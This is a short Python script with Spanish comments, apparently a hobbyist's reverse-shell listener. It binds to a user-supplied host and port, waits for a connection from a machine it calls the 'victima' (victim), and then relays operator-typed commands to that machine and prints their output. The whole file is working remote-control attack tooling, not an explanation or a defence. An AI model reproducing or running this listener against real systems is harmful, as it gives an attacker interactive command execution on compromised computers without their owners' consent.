#!/usr/bin/env python
#_*_ coding: utf8 _*_

#--GLOSARIO--#
'''
    (server.bind) : se utiliza para establecer una red local donde se comunicaran los archivos
    (server.listen) : es una funcion que se utiliza para detectar cuando a ingresa alguien a la red especificada, tiene como argumento el numero que usuarios que se desea escuchar
    (server.accept) : es con lo que se obtiene la informacion del usuario que accedio

'''
#--GLOSARIO--#
host = input("Host: ")
puerto = input("Puerto: ")
import socket
def main():
    server = socket.socket()
    server.bind((str(host), int(puerto) )) 
    server.listen(1)
    print('Escuchando......')
    victima, direccion = server.accept()
    print('Conexion de: {}'.format(direccion))
    ver = victima.recv(1024)
    print(ver)
    while True:
        if ver == b"1":
            while True:
                comando = input("shell@shell: ")
                victima.send(comando.encode())
                resultado = victima.recv(2048)
                print(resultado.decode('utf8', 'ignore'))
        break

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()